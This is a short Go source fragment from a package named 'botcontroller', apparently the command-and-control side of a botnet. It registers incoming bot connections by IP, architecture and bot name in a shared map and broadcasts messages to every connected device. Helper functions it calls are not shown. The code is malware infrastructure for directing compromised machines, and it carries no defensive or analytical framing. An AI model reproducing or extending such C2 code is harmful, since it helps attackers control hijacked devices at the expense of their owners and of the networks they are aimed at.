package botcontroller

import (
	"fmt"
	"net"
	"strings"
)

type Device struct {
	conn                 net.Conn
	Arch, Botname, BotIP string
}

func (bot *Device) Botwrite(text string) (int, error) {
	return bot.conn.Write([]byte(text))
}

// Sends a Message To all devices
func Broadcast(msg []byte) {

	// Range Loop Over Map
	for _, device := range Devices {
		device.conn.Write(msg)
	}

}

func wrapbot(bot net.Conn) {

	defer bot.Close()

	Host := strings.Split(bot.RemoteAddr().String(), ":")[0] // Spliting the port and getting the ip

	fmt.Println("<machine> (attached)", Host)

	BotStruct := appendbot(Host, bot)

	if BotStruct == nil {
		return
	}

	mut.Lock()
	Devices[Host] = BotStruct // Add Bot
	mut.Unlock()

	fmt.Printf("<machine> (authenticated) %s arch: %s, name: %s\n", Host, BotStruct.Arch, BotStruct.Botname)

	BotStruct.checkbot() // Check If Device Is Still Conneted If Not Loop WIll Break

	return

}
